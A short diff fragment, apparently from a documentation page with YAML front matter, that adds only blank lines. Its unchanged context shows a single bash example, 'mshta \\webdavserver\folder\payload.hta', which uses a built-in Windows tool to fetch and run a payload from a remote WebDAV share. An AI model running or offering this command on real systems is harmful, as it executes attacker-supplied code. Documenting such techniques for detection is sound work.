@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:11.492312+00:00'
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
+
+
